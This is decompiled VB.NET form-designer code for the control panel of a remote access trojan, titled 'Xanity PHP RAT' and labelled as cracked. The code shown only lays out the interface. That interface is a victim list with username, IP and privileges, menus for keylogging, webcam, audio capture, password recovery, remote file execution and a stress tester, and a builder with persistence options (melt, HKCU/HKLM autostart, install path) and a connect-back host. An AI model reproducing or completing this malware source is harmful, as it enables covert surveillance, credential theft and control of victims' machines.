            Me.countryflags.Images.SetKeyName(&HEC, "vi.png")
            Me.countryflags.Images.SetKeyName(&HED, "vn.png")
            Me.countryflags.Images.SetKeyName(&HEE, "vu.png")
            Me.countryflags.Images.SetKeyName(&HEF, "wales.png")
            Me.countryflags.Images.SetKeyName(240, "wf.png")
            Me.countryflags.Images.SetKeyName(&HF1, "ws.png")
            Me.countryflags.Images.SetKeyName(&HF2, "ye.png")
            Me.countryflags.Images.SetKeyName(&HF3, "yt.png")
            Me.countryflags.Images.SetKeyName(&HF4, "za.png")
            Me.countryflags.Images.SetKeyName(&HF5, "zm.png")
            Me.countryflags.Images.SetKeyName(&HF6, "zw.png")
            Me.countryflags.Images.SetKeyName(&HF7, "fgr.png")
            Me.updateserver.Interval = &H2710
            Me.rightclick.Items.AddRange(New ToolStripItem() { Me.PingToolStripMenuItem, Me.SystemInformationToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.ServerOptionsToolStripMenuItem, Me.MiscellaneousToolStripMenuItem, Me.MapViewToolStripMenuItem, Me.STRESSTesterToolStripMenuItem })
            Me.rightclick.Name = "rightclick"
            Dim size2 As New Size(&HB3, &H9E)
            Me.rightclick.Size = size2
            Me.PingToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.PingToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.CountryToolStripMenuItem, Me.HostToolStripMenuItem, Me.PrivilegsToolStripMenuItem, Me.OSToolStripMenuItem })
            Me.PingToolStripMenuItem.ForeColor = Color.White
            Me.PingToolStripMenuItem.Image = DirectCast(manager.GetObject("PingToolStripMenuItem.Image"), Image)
            Me.PingToolStripMenuItem.Name = "PingToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.PingToolStripMenuItem.Size = size2
            Me.PingToolStripMenuItem.Text = "Group By"
            Me.CountryToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CountryToolStripMenuItem.ForeColor = Color.White
            Me.CountryToolStripMenuItem.Image = DirectCast(manager.GetObject("CountryToolStripMenuItem.Image"), Image)
            Me.CountryToolStripMenuItem.Name = "CountryToolStripMenuItem"
            size2 = New Size(&H7C, &H16)
            Me.CountryToolStripMenuItem.Size = size2
            Me.CountryToolStripMenuItem.Text = "Country"
            Me.HostToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.HostToolStripMenuItem.ForeColor = Color.White
            Me.HostToolStripMenuItem.Image = DirectCast(manager.GetObject("HostToolStripMenuItem.Image"), Image)
            Me.HostToolStripMenuItem.Name = "HostToolStripMenuItem"
            size2 = New Size(&H7C, &H16)
            Me.HostToolStripMenuItem.Size = size2
            Me.HostToolStripMenuItem.Text = "Host"
            Me.PrivilegsToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.PrivilegsToolStripMenuItem.ForeColor = Color.White
            Me.PrivilegsToolStripMenuItem.Image = DirectCast(manager.GetObject("PrivilegsToolStripMenuItem.Image"), Image)
            Me.PrivilegsToolStripMenuItem.Name = "PrivilegsToolStripMenuItem"
            size2 = New Size(&H7C, &H16)
            Me.PrivilegsToolStripMenuItem.Size = size2
            Me.PrivilegsToolStripMenuItem.Text = "Privileges"
            Me.OSToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.OSToolStripMenuItem.ForeColor = Color.White
            Me.OSToolStripMenuItem.Image = DirectCast(manager.GetObject("OSToolStripMenuItem.Image"), Image)
            Me.OSToolStripMenuItem.Name = "OSToolStripMenuItem"
            size2 = New Size(&H7C, &H16)
            Me.OSToolStripMenuItem.Size = size2
            Me.OSToolStripMenuItem.Text = "OS"
            Me.SystemInformationToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.SystemInformationToolStripMenuItem.ForeColor = Color.White
            Me.SystemInformationToolStripMenuItem.Image = DirectCast(manager.GetObject("SystemInformationToolStripMenuItem.Image"), Image)
            Me.SystemInformationToolStripMenuItem.Name = "SystemInformationToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.SystemInformationToolStripMenuItem.Size = size2
            Me.SystemInformationToolStripMenuItem.Text = "System Information"
            Me.SurveillanceToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.RemoteScreenshotToolStripMenuItem, Me.RemoteKeyloggerToolStripMenuItem, Me.AudioCaptureToolStripMenuItem, Me.WebcamToolStripMenuItem, Me.PasswordRecoveryToolStripMenuItem })
            Me.SurveillanceToolStripMenuItem.ForeColor = Color.White
            Me.SurveillanceToolStripMenuItem.Image = DirectCast(manager.GetObject("SurveillanceToolStripMenuItem.Image"), Image)
            Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.SurveillanceToolStripMenuItem.Size = size2
            Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
            Me.RemoteScreenshotToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RemoteScreenshotToolStripMenuItem.ForeColor = Color.White
            Me.RemoteScreenshotToolStripMenuItem.Image = DirectCast(manager.GetObject("RemoteScreenshotToolStripMenuItem.Image"), Image)
            Me.RemoteScreenshotToolStripMenuItem.Name = "RemoteScreenshotToolStripMenuItem"
            size2 = New Size(&HAF, &H16)
            Me.RemoteScreenshotToolStripMenuItem.Size = size2
            Me.RemoteScreenshotToolStripMenuItem.Text = "Remote Desktop"
            Me.RemoteKeyloggerToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RemoteKeyloggerToolStripMenuItem.ForeColor = Color.White
            Me.RemoteKeyloggerToolStripMenuItem.Image = DirectCast(manager.GetObject("RemoteKeyloggerToolStripMenuItem.Image"), Image)
            Me.RemoteKeyloggerToolStripMenuItem.Name = "RemoteKeyloggerToolStripMenuItem"
            size2 = New Size(&HAF, &H16)
            Me.RemoteKeyloggerToolStripMenuItem.Size = size2
            Me.RemoteKeyloggerToolStripMenuItem.Text = "Remote Keylogger"
            Me.AudioCaptureToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.AudioCaptureToolStripMenuItem.ForeColor = Color.White
            Me.AudioCaptureToolStripMenuItem.Image = DirectCast(manager.GetObject("AudioCaptureToolStripMenuItem.Image"), Image)
            Me.AudioCaptureToolStripMenuItem.Name = "AudioCaptureToolStripMenuItem"
            size2 = New Size(&HAF, &H16)
            Me.AudioCaptureToolStripMenuItem.Size = size2
            Me.AudioCaptureToolStripMenuItem.Text = "Audio Capture"
            Me.WebcamToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.WebcamToolStripMenuItem.ForeColor = Color.White
            Me.WebcamToolStripMenuItem.Image = DirectCast(manager.GetObject("WebcamToolStripMenuItem.Image"), Image)
            Me.WebcamToolStripMenuItem.Name = "WebcamToolStripMenuItem"
            size2 = New Size(&HAF, &H16)
            Me.WebcamToolStripMenuItem.Size = size2
            Me.WebcamToolStripMenuItem.Text = "Webcam"
            Me.PasswordRecoveryToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.PasswordRecoveryToolStripMenuItem.ForeColor = Color.White
            Me.PasswordRecoveryToolStripMenuItem.Image = DirectCast(manager.GetObject("PasswordRecoveryToolStripMenuItem.Image"), Image)
            Me.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem"
            size2 = New Size(&HAF, &H16)
            Me.PasswordRecoveryToolStripMenuItem.Size = size2
            Me.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery"
            Me.ServerOptionsToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ServerOptionsToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.UpdateServerToolStripMenuItem, Me.ExecuteFileToolStripMenuItem, Me.UninstallToolStripMenuItem, Me.RestartToolStripMenuItem1 })
            Me.ServerOptionsToolStripMenuItem.ForeColor = Color.White
            Me.ServerOptionsToolStripMenuItem.Image = DirectCast(manager.GetObject("ServerOptionsToolStripMenuItem.Image"), Image)
            Me.ServerOptionsToolStripMenuItem.Name = "ServerOptionsToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.ServerOptionsToolStripMenuItem.Size = size2
            Me.ServerOptionsToolStripMenuItem.Text = "Server Options"
            Me.UpdateServerToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.UpdateServerToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.FromLinkToolStripMenuItem })
            Me.UpdateServerToolStripMenuItem.ForeColor = Color.White
            Me.UpdateServerToolStripMenuItem.Image = DirectCast(manager.GetObject("UpdateServerToolStripMenuItem.Image"), Image)
            Me.UpdateServerToolStripMenuItem.Name = "UpdateServerToolStripMenuItem"
            size2 = New Size(&H93, &H16)
            Me.UpdateServerToolStripMenuItem.Size = size2
            Me.UpdateServerToolStripMenuItem.Text = "Update Server"
            Me.FromLinkToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FromLinkToolStripMenuItem.ForeColor = Color.White
            Me.FromLinkToolStripMenuItem.Image = DirectCast(manager.GetObject("FromLinkToolStripMenuItem.Image"), Image)
            Me.FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem"
            size2 = New Size(&H7F, &H16)
            Me.FromLinkToolStripMenuItem.Size = size2
            Me.FromLinkToolStripMenuItem.Text = "From Link"
            Me.ExecuteFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ExecuteFileToolStripMenuItem.ForeColor = Color.White
            Me.ExecuteFileToolStripMenuItem.Image = DirectCast(manager.GetObject("ExecuteFileToolStripMenuItem.Image"), Image)
            Me.ExecuteFileToolStripMenuItem.Name = "ExecuteFileToolStripMenuItem"
            size2 = New Size(&H93, &H16)
            Me.ExecuteFileToolStripMenuItem.Size = size2
            Me.ExecuteFileToolStripMenuItem.Text = "Execute File"
            Me.UninstallToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.UninstallToolStripMenuItem.ForeColor = Color.White
            Me.UninstallToolStripMenuItem.Image = DirectCast(manager.GetObject("UninstallToolStripMenuItem.Image"), Image)
            Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
            size2 = New Size(&H93, &H16)
            Me.UninstallToolStripMenuItem.Size = size2
            Me.UninstallToolStripMenuItem.Text = "Uninstall"
            Me.RestartToolStripMenuItem1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RestartToolStripMenuItem1.ForeColor = Color.White
            Me.RestartToolStripMenuItem1.Image = DirectCast(manager.GetObject("RestartToolStripMenuItem1.Image"), Image)
            Me.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1"
            size2 = New Size(&H93, &H16)
            Me.RestartToolStripMenuItem1.Size = size2
            Me.RestartToolStripMenuItem1.Text = "Restart"
            Me.MiscellaneousToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.MiscellaneousToolStripMenuItem.ForeColor = Color.White
            Me.MiscellaneousToolStripMenuItem.Image = DirectCast(manager.GetObject("MiscellaneousToolStripMenuItem.Image"), Image)
            Me.MiscellaneousToolStripMenuItem.Name = "MiscellaneousToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.MiscellaneousToolStripMenuItem.Size = size2
            Me.MiscellaneousToolStripMenuItem.Text = "Miscellaneous"
            Me.MapViewToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.MapViewToolStripMenuItem.ForeColor = Color.White
            Me.MapViewToolStripMenuItem.Image = DirectCast(manager.GetObject("MapViewToolStripMenuItem.Image"), Image)
            Me.MapViewToolStripMenuItem.Name = "MapViewToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.MapViewToolStripMenuItem.Size = size2
            Me.MapViewToolStripMenuItem.Text = "MapView"
            Me.STRESSTesterToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.STRESSTesterToolStripMenuItem.ForeColor = Color.White
            Me.STRESSTesterToolStripMenuItem.Image = DirectCast(manager.GetObject("STRESSTesterToolStripMenuItem.Image"), Image)
            Me.STRESSTesterToolStripMenuItem.Name = "STRESSTesterToolStripMenuItem"
            size2 = New Size(&HB2, &H16)
            Me.STRESSTesterToolStripMenuItem.Size = size2
            Me.STRESSTesterToolStripMenuItem.Text = "STRESS Tester"
            Me.Notify.ContextMenuStrip = Me.notifyrightclick
            Me.Notify.Icon = DirectCast(manager.GetObject("Notify.Icon"), Icon)
            Me.Notify.Text = "Xanity"
            Me.Notify.Visible = True
            Me.notifyrightclick.Items.AddRange(New ToolStripItem() { Me.ShowToolStripMenuItem, Me.ExitToolStripMenuItem })
            Me.notifyrightclick.Name = "notifyrightclick"
            size2 = New Size(&H68, &H30)
            Me.notifyrightclick.Size = size2
            Me.ShowToolStripMenuItem.Image = DirectCast(manager.GetObject("ShowToolStripMenuItem.Image"), Image)
            Me.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem"
            size2 = New Size(&H67, &H16)
            Me.ShowToolStripMenuItem.Size = size2
            Me.ShowToolStripMenuItem.Text = "Show"
            Me.ExitToolStripMenuItem.Image = DirectCast(manager.GetObject("ExitToolStripMenuItem.Image"), Image)
            Me.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem"
            size2 = New Size(&H67, &H16)
            Me.ExitToolStripMenuItem.Size = size2
            Me.ExitToolStripMenuItem.Text = "Exit"
            Me.ContextDeleteHosts.Items.AddRange(New ToolStripItem() { Me.ToolStripMenuItem1 })
            Me.ContextDeleteHosts.Name = "ContextMenuStrip1"
            size2 = New Size(&H6C, &H1A)
            Me.ContextDeleteHosts.Size = size2
            Me.ToolStripMenuItem1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ToolStripMenuItem1.ForeColor = Color.White
            Me.ToolStripMenuItem1.Image = DirectCast(manager.GetObject("ToolStripMenuItem1.Image"), Image)
            Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
            size2 = New Size(&H6B, &H16)
            Me.ToolStripMenuItem1.Size = size2
            Me.ToolStripMenuItem1.Text = "Delete"
            Me.DeleteToolStripMenuItem.Image = DirectCast(manager.GetObject("DeleteToolStripMenuItem.Image"), Image)
            Me.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem"
            size2 = New Size(&H6B, &H16)
            Me.DeleteToolStripMenuItem.Size = size2
            Me.DeleteToolStripMenuItem.Text = "Delete"
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.BorderColor = Color.White
            Me.FormSkin1.Controls.Add(Me.Labelstubinfo)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.ListView1)
            Me.FormSkin1.Controls.Add(Me.TabControl1)
            Me.FormSkin1.Controls.Add(Me.MaxButton)
            Me.FormSkin1.Controls.Add(Me.MiniButton)
            Me.FormSkin1.Controls.Add(Me.CloseButton)
            Me.FormSkin1.Controls.Add(Me.MenuStrip1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            size2 = New Size(&H2E5, &H18E)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Xanity PHP RAT by XilluX [2.0.0.1] | Cracked By Prototype_TR [Cyber-Warrior.Org]"
            Me.Labelstubinfo.AutoSize = True
            Me.Labelstubinfo.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.Labelstubinfo.Font = New Font("Segoe UI", 8!)
            Me.Labelstubinfo.ForeColor = Color.White
            point2 = New Point(&H18B, &H17B)
            Me.Labelstubinfo.Location = point2
            Me.Labelstubinfo.Name = "Labelstubinfo"
            size2 = New Size(0, 13)
            Me.Labelstubinfo.Size = size2
            Me.Labelstubinfo.TabIndex = 6
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H177)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.DeepPink
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H2E5, &H17)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 5
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.ListView1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ListView1.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5, Me.ColumnHeader6, Me.ColumnHeader7 })
            Me.ListView1.FullRowSelect = True
            point2 = New Point(&H139, 20)
            Me.ListView1.Location = point2
            Me.ListView1.Name = "ListView1"
            size2 = New Size(0, 0)
            Me.ListView1.Size = size2
            Me.ListView1.TabIndex = 1
            Me.ListView1.UseCompatibleStateImageBehavior = False
            Me.ListView1.View = View.Details
            Me.ListView1.Visible = False
            Me.ColumnHeader1.Text = "Country"
            Me.ColumnHeader2.Text = "Username"
            Me.ColumnHeader2.Width = &H5B
            Me.ColumnHeader3.Text = "Remote-IP"
            Me.ColumnHeader3.Width = 90
            Me.ColumnHeader4.Text = "Operating System"
            Me.ColumnHeader4.Width = &H9A
            Me.ColumnHeader5.Text = "Version"
            Me.ColumnHeader5.Width = 100
            Me.ColumnHeader6.Text = "Privilegs"
            Me.ColumnHeader6.Width = &H55
            Me.ColumnHeader7.Text = "Host"
            Me.ColumnHeader7.Width = &H71
            Me.TabControl1.ActiveColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.TabControl1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.TabControl1.Controls.Add(Me.PageMain)
            Me.TabControl1.Controls.Add(Me.PageBuilder)
            Me.TabControl1.Controls.Add(Me.PageSettings)
            Me.TabControl1.Controls.Add(Me.PageNews)
            Me.TabControl1.Font = New Font("Segoe UI", 10!)
            size2 = New Size(120, 40)
            Me.TabControl1.ItemSize = size2
            point2 = New Point(6, &H51)
            Me.TabControl1.Location = point2
            Me.TabControl1.Name = "TabControl1"
            Me.TabControl1.SelectedIndex = 0
            size2 = New Size(&H2D9, &H124)
            Me.TabControl1.Size = size2
            Me.TabControl1.SizeMode = TabSizeMode.Fixed
            Me.TabControl1.TabIndex = 3
            Me.PageMain.BackColor = Color.FromArgb(60, 70, &H49)
            Me.PageMain.Controls.Add(Me.listviewmain)
            Me.PageMain.ForeColor = Color.FromArgb(&H2E, &H2E, &H2E)
            point2 = New Point(4, &H2C)
            Me.PageMain.Location = point2
            Me.PageMain.Name = "PageMain"
            Dim padding2 As New Padding(3)
            Me.PageMain.Padding = padding2
            size2 = New Size(&H2D1, &HF4)
            Me.PageMain.Size = size2
            Me.PageMain.TabIndex = 0
            Me.PageMain.Text = "Main"
            Me.listviewmain.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.listviewmain.Columns.AddRange(New ColumnHeader() { Me.location, Me.user, Me.ip, Me.os, Me.ver, Me.priv, Me.server })
            Me.listviewmain.ContextMenuStrip = Me.rightclick
            Me.listviewmain.ForeColor = Color.White
            Me.listviewmain.FullRowSelect = True
            point2 = New Point(0, 0)
            Me.listviewmain.Location = point2
            Me.listviewmain.Name = "listviewmain"
            size2 = New Size(&H2D1, &HF4)
            Me.listviewmain.Size = size2
            Me.listviewmain.SmallImageList = Me.countryflags
            Me.listviewmain.TabIndex = 0
            Me.listviewmain.UseCompatibleStateImageBehavior = False
            Me.listviewmain.View = View.Details
            Me.location.Text = "Country"
            Me.user.Text = "Username"
            Me.user.Width = &H5B
            Me.ip.Text = "Remote-IP"
            Me.ip.Width = &H68
            Me.os.Text = "Operating System"
            Me.os.Width = 170
            Me.ver.Text = "Version"
            Me.ver.Width = &H4F
            Me.priv.Text = "Privilegs"
            Me.priv.Width = &H40
            Me.server.Text = "Host"
            Me.server.Width = &H93
            Me.PageBuilder.BackColor = Color.FromArgb(60, 70, &H49)
            Me.PageBuilder.Controls.Add(Me.DotNetBarTabcontrol1)
            point2 = New Point(4, &H2C)
            Me.PageBuilder.Location = point2
            Me.PageBuilder.Name = "PageBuilder"
            padding2 = New Padding(3)
            Me.PageBuilder.Padding = padding2
            size2 = New Size(&H2D1, &HF4)
            Me.PageBuilder.Size = size2
            Me.PageBuilder.TabIndex = 1
            Me.PageBuilder.Text = "Builder"
            Me.DotNetBarTabcontrol1.Alignment = TabAlignment.Left
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage1)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage2)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage3)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage4)
            size2 = New Size(&H2C, &H88)
            Me.DotNetBarTabcontrol1.ItemSize = size2
            point2 = New Point(1, 1)
            Me.DotNetBarTabcontrol1.Location = point2
            Me.DotNetBarTabcontrol1.Multiline = True
            Me.DotNetBarTabcontrol1.Name = "DotNetBarTabcontrol1"
            Me.DotNetBarTabcontrol1.SelectedIndex = 0
            size2 = New Size(720, &HF3)
            Me.DotNetBarTabcontrol1.Size = size2
            Me.DotNetBarTabcontrol1.SizeMode = TabSizeMode.Fixed
            Me.DotNetBarTabcontrol1.TabIndex = 0
            Me.TabPage1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage1.Controls.Add(Me.FlatGroupBox6)
            Me.TabPage1.Controls.Add(Me.FlatGroupBox5)
            Me.TabPage1.Controls.Add(Me.FlatGroupBox4)
            point2 = New Point(140, 4)
            Me.TabPage1.Location = point2
            Me.TabPage1.Name = "TabPage1"
            padding2 = New Padding(3)
            Me.TabPage1.Padding = padding2
            size2 = New Size(&H240, &HEB)
            Me.TabPage1.Size = size2
            Me.TabPage1.TabIndex = 0
            Me.TabPage1.Text = "Main Settings"
            Me.FlatGroupBox6.BackColor = Color.Transparent
            Me.FlatGroupBox6.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox6.Controls.Add(Me.Panel1)
            Me.FlatGroupBox6.Controls.Add(Me.cb_hklm)
            Me.FlatGroupBox6.Controls.Add(Me.cb_hkcu)
            Me.FlatGroupBox6.Controls.Add(Me.tb_install_path)
            Me.FlatGroupBox6.Controls.Add(Me.cb_melt)
            Me.FlatGroupBox6.Controls.Add(Me.cb_install)
            Me.FlatGroupBox6.Controls.Add(Me.cb_install_enable)
            Me.FlatGroupBox6.Font = New Font("Segoe UI", 10!)
            point2 = New Point(3, &H5B)
            Me.FlatGroupBox6.Location = point2
            Me.FlatGroupBox6.Name = "FlatGroupBox6"
            Me.FlatGroupBox6.ShowText = True
            size2 = New Size(&H23D, &H90)
            Me.FlatGroupBox6.Size = size2
            Me.FlatGroupBox6.TabIndex = 1
            Me.FlatGroupBox6.Text = "Installation & Startup"
            Me.Panel1.Controls.Add(Me.rb_appdata)
            Me.Panel1.Controls.Add(Me.rb_temp)
            point2 = New Point(&H69, &H41)
            Me.Panel1.Location = point2
            Me.Panel1.Name = "Panel1"
            size2 = New Size(&HA4, &H1D)
            Me.Panel1.Size = size2
            Me.Panel1.TabIndex = 8
            Me.rb_appdata.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.rb_appdata.Checked = False
            Me.rb_appdata.Cursor = Cursors.Hand
            Me.rb_appdata.Enabled = False
            Me.rb_appdata.Font = New Font("Segoe UI", 10!)
            Me.rb_appdata.ForeColor = Color.White
            point2 = New Point(3, 3)
            Me.rb_appdata.Location = point2
            Me.rb_appdata.Name = "rb_appdata"
            Me.rb_appdata.Options = _Options.Style1
            size2 = New Size(&H54, &H16)
            Me.rb_appdata.Size = size2
            Me.rb_appdata.TabIndex = 3
            Me.rb_appdata.Text = "AppData"
            Me.rb_temp.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.rb_temp.Checked = False
            Me.rb_temp.Cursor = Cursors.Hand
            Me.rb_temp.Enabled = False
            Me.rb_temp.Font = New Font("Segoe UI", 10!)
            Me.rb_temp.ForeColor = Color.White
            point2 = New Point(&H5D, 3)
            Me.rb_temp.Location = point2
            Me.rb_temp.Name = "rb_temp"
            Me.rb_temp.Options = _Options.Style1
            size2 = New Size(&H42, &H16)
            Me.rb_temp.Size = size2
            Me.rb_temp.TabIndex = 4
            Me.rb_temp.Text = "Temp"
            Me.cb_hklm.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.cb_hklm.Checked = False
            Me.cb_hklm.Cursor = Cursors.Hand
            Me.cb_hklm.Enabled = False
            Me.cb_hklm.Font = New Font("Segoe UI", 10!)
            Me.cb_hklm.ForeColor = Color.White
            point2 = New Point(240, &H61)
            Me.cb_hklm.Location = point2
            Me.cb_hklm.Name = "cb_hklm"
            Me.cb_hklm.Options = _Options.Style1
            size2 = New Size(&HD1, &H16)
            Me.cb_hklm.Size = size2
            Me.cb_hklm.TabIndex = 7
            Me.cb_hklm.Text = "HKLM Autostart (needs admin)"
            Me.cb_hkcu.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.cb_hkcu.Checked = False
            Me.cb_hkcu.Cursor = Cursors.Hand
            Me.cb_hkcu.Enabled = False
            Me.cb_hkcu.Font = New Font("Segoe UI", 10!)
            Me.cb_hkcu.ForeColor = Color.White
            point2 = New Point(&H6D, &H61)
            Me.cb_hkcu.Location = point2
            Me.cb_hkcu.Name = "cb_hkcu"
            Me.cb_hkcu.Options = _Options.Style1
            size2 = New Size(&H7D, &H16)
            Me.cb_hkcu.Size = size2
            Me.cb_hkcu.TabIndex = 6
            Me.cb_hkcu.Text = "HKCU Autostart"
            Me.tb_install_path.BackColor = Color.Transparent
            Me.tb_install_path.Enabled = False
            point2 = New Point(&H10F, &H41)
            Me.tb_install_path.Location = point2
            Me.tb_install_path.MaxLength = &H7FFF
            Me.tb_install_path.Multiline = False
            Me.tb_install_path.Name = "tb_install_path"
            Me.tb_install_path.ReadOnly = False
            size2 = New Size(280, &H1D)
            Me.tb_install_path.Size = size2
            Me.tb_install_path.TabIndex = 5
            Me.tb_install_path.Text = "Example: file.exe"
            Me.tb_install_path.TextAlign = HorizontalAlignment.Left
            Me.tb_install_path.TextColor = Color.White
            Me.tb_install_path.UseSystemPasswordChar = False
            Me.cb_melt.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.cb_melt.BaseColor = Color.DeepPink
            Me.cb_melt.BorderColor = Color.White
            Me.cb_melt.Checked = False
            Me.cb_melt.Cursor = Cursors.Hand
            Me.cb_melt.Enabled = False
            Me.cb_melt.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H13, &H61)
            Me.cb_melt.Location = point2
            Me.cb_melt.Name = "cb_melt"
            Me.cb_melt.Options = _Options.Style1
            size2 = New Size(&H38, &H16)
            Me.cb_melt.Size = size2
            Me.cb_melt.TabIndex = 2
            Me.cb_melt.Text = "Melt"
            Me.cb_install.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.cb_install.BaseColor = Color.DeepPink
            Me.cb_install.BorderColor = Color.White
            Me.cb_install.Checked = False
            Me.cb_install.Cursor = Cursors.Hand
            Me.cb_install.Enabled = False
            Me.cb_install.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H13, &H45)
            Me.cb_install.Location = point2
            Me.cb_install.Name = "cb_install"
            Me.cb_install.Options = _Options.Style1
            size2 = New Size(&H54, &H16)
            Me.cb_install.Size = size2
            Me.cb_install.TabIndex = 1
            Me.cb_install.Text = "Install to: "
            Me.cb_install_enable.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.cb_install_enable.BaseColor = Color.DeepPink
            Me.cb_install_enable.BorderColor = Color.White
            Me.cb_install_enable.Checked = False
            Me.cb_install_enable.Cursor = Cursors.Hand
            Me.cb_install_enable.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H13, &H29)
            Me.cb_install_enable.Location = point2
            Me.cb_install_enable.Name = "cb_install_enable"
            Me.cb_install_enable.Options = _Options.Style1
            size2 = New Size(&H43, &H16)
            Me.cb_install_enable.Size = size2
            Me.cb_install_enable.TabIndex = 0
            Me.cb_install_enable.Text = "Enable"
            Me.FlatGroupBox5.BackColor = Color.Transparent
            Me.FlatGroupBox5.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox5.Controls.Add(Me.tb_host)
            Me.FlatGroupBox5.Controls.Add(Me.FlatLabel3)
            Me.FlatGroupBox5.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H7B, 3)
            Me.FlatGroupBox5.Location = point2
            Me.FlatGroupBox5.Name = "FlatGroupBox5"
            Me.FlatGroupBox5.ShowText = True
            size2 = New Size(&H1C5, &H56)
            Me.FlatGroupBox5.Size = size2
            Me.FlatGroupBox5.TabIndex = 1
            Me.FlatGroupBox5.Text = "Connect back to:"
